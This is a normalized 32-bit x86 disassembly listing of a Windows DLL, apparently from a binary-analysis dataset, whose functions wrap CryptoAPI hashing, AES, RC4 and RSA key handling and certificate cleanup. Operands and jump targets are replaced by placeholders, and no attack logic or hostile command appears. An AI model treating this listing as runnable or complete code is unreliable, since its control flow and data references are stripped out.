push [ ebp - 0x30 ]
mov [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x0
push edi
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x2
push edi
call j_sub_1003f3e3
add esp 0x4
lea eax [ ebp - 0x28 ]
mov ecx esi
push eax
call sub_10004f60
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
call [ GetLastError@IAT ]
push edi
call j_sub_1003f3e3
mov [ esi + 0x14 ] 0xf
add esp 0x4
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10006630
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100019e0
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10006670
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100066a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bff8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10006730
push esi
push edi
mov esi ecx
push 0xf0000040
push [ esi + 0x4 ]
lea edi [ esi + 0xc ]
push 0x0
push 0x0
push edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x0
push [ esi + 0x8 ]
push [ edi ]
call [ CryptCreateHash@IAT ]
neg eax
pop edi
sbb eax eax
neg eax
pop esi
retn
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push 0xf0000048
push [ esi + 0x4 ]
push 0x0
push 0x0
push edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
sub_100067a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c028
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] 0x10
push 0x0
push [ ebp + 0x18 ]
cmovae eax [ ebp + 0x8 ]
push eax
push [ ecx + 0x10 ]
call [ CryptHashData@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10006830
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c071
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push 0x0
push eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] 0x0
push eax
push 0x4
push [ ebx + 0x10 ]
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] 0x4
mov [ ebp - 0x30 ] 0x0
call [ CryptGetHashParam@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x30 ]
call sub_1003c61a
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push eax
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] eax
push r--data
mov [ esi ] al
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
push r--data
mov ecx esi
call sub_10001820
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x30 ]
push 0x0
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x34 ]
push eax
push edi
push 0x2
push [ ebx + 0x10 ]
call [ CryptGetHashParam@IAT ]
test eax eax
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x30 ]
mov [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x0
push edi
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x1
push edi
call j_sub_1003f3e3
add esp 0x4
lea eax [ ebp - 0x28 ]
mov ecx esi
push eax
call sub_10004f60
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push edi
call j_sub_1003f3e3
add esp 0x4
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100069b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c0c6
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] r--data
mov [ ecx + 0xc ] 0x0
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x4 ] 0x18
mov [ ecx + 0x8 ] 0x6610
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] r--data
mov [ ecx + 0x34 ] 0xf
mov [ ecx + 0x30 ] 0x0
mov [ ecx + 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ecx + 0x4c ] 0xf
mov [ ecx + 0x48 ] 0x0
mov [ ecx + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov [ ecx + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_10006a70
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10006aa0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10006aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c116
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x4c ] 0x10
jb r-xdata
mov [ esi + 0x4c ] 0xf
mov [ esi + 0x48 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x34 ] 0x10
jb r-xdata
push [ esi + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push [ esi + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call [ CryptDestroyKey@IAT ]
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov [ esi + 0xc ] 0x0
sub_10006b80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c150
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
sub esp 0x18
mov ecx esp
mov [ ebp - 0x14 ] esp
lea eax [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_100061b0
test eax eax
je r-xdata
xor esi esi
push 0x0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x4
push eax
lea edi [ esi + 0x1c ]
push edi
push 0x8
push [ esi + 0x10 ]
call [ CryptGetKeyParam@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
shr [ edi ] 0x3
lea eax [ esi + 0x20 ]
cmp [ eax + 0x14 ] 0x10
mov [ eax + 0x10 ] 0x0
jb r-xdata
mov [ eax ] 0x0
lea eax [ esi + 0x38 ]
cmp [ eax + 0x14 ] 0x10
mov [ eax + 0x10 ] 0x0
jb r-xdata
mov eax [ eax ]
mov [ eax ] 0x0
mov esi 0x1
jmp r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
sub_10006c80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c1a9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
lea esi [ ebx + 0x20 ]
push eax
mov ecx esi
call sub_100050b0
mov eax [ ebp - 0x2c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ ebx + 0x1c ]
cmp eax ecx
jae r-xdata
push eax
sub esp 0x18
mov ecx esp
mov [ ebp - 0x2c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push esi
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
push edi
mov [ ebp - 0x4 ] 0x1
mov ecx ebx
call sub_10006300
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
xor edx edx
div ecx
push 0x0
sub esp 0x18
mov esi eax
imul esi ecx
mov ecx esp
mov [ ebp - 0x2c ] esp
push esi
push 0x0
push ecx
lea ecx [ ebx + 0x20 ]
call sub_10006fa0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov ecx ebx
call sub_10006300
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebx + 0x20 ]
push esi
push 0x0
call sub_10001ae0
lea eax [ ebp - 0x28 ]
mov ecx edi
push eax
call sub_10004f60
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10006e10
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c1a9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
lea esi [ ebx + 0x38 ]
push eax
mov ecx esi
call sub_100050b0
mov eax [ ebp - 0x2c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebx + 0x1c ]
cmp eax ecx
jae r-xdata
push eax
sub esp 0x18
mov ecx esp
mov [ ebp - 0x2c ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push esi
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
push edi
mov [ ebp - 0x4 ] 0x1
mov ecx ebx
call sub_100064a0
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
xor edx edx
div ecx
push 0x0
sub esp 0x18
mov esi eax
imul esi ecx
mov ecx esp
mov [ ebp - 0x2c ] esp
push esi
push 0x0
push ecx
lea ecx [ ebx + 0x38 ]
call sub_10006fa0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov ecx ebx
call sub_100064a0
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebx + 0x38 ]
push esi
push 0x0
call sub_10001ae0
lea eax [ ebp - 0x28 ]
mov ecx edi
push eax
call sub_10004f60
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10006fa0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x0
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10007010
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c1e3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1c
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x6801
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
sub_100070d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c20b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x50
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor esi esi
sub esp 0x8
mov ecx eax
call sub_100069b0
mov esi eax
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
sub_10007160
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c20b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x28
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_100072b0
mov esi eax
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
sub_100071f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c243
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
push 0x14
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
sub_100072b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c270
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] r--data
mov [ ecx + 0xc ] 0x0
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x4 ] 0x1
mov [ ecx + 0x8 ] 0xa400
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] r--data
mov [ ecx + 0x14 ] 0x40
mov [ ecx + 0x18 ] 0x40
mov [ ecx + 0x1c ] 0x0
mov [ ecx + 0x20 ] 0x0
mov [ ecx + 0x24 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10007360
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007390
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10007390
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c2a0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ CryptDestroyKey@IAT ]
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov [ esi + 0x24 ] 0x0
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call [ CertFreeCertificateContext@IAT ]
mov [ esi + 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0x0
push eax
call [ CertCloseStore@IAT ]
mov [ esi + 0x1c ] 0x0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call [ CryptDestroyKey@IAT ]
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov [ esi + 0xc ] 0x0
sub_10007480
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ CryptDestroyKey@IAT ]
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov [ esi + 0x24 ] 0x0
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call [ CertFreeCertificateContext@IAT ]
mov [ esi + 0x20 ] 0x0
pop esi
retn
push 0x0
push eax
call [ CertCloseStore@IAT ]
mov [ esi + 0x1c ] 0x0
sub_100074e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c2d9
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] 0x0
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_10007540
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c318
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x0
je r-xdata
xor esi esi
call sub_10007480
mov ecx [ ebp + 0x1c ]
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
cmp ecx 0x10
cmovae eax edx
cmp [ eax ] 0x0
lea eax [ ebp + 0x8 ]
jne r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp ecx 0x10
cmovae eax edx
cmp [ eax ] 0xff
jne r-xdata
cmp ecx 0x10
lea ecx [ ebp + 0x8 ]
cmovae eax edx
push [ eax + 0x1 ]
sub esp 0x18
mov eax esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
push 0x5
push eax
call sub_10006fa0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10007640
mov esi eax
jmp r-xdata
push 0x1
sub esp 0x18
lea ecx [ ebp + 0x8 ]
mov eax esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
push 0x1
push eax
call sub_10006fa0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_100077c0
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
sub_10007640
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c350
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x18 ]
shl eax 0x3
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x3c ] 0x206
mov [ ebp - 0x34 ] 0x31415352
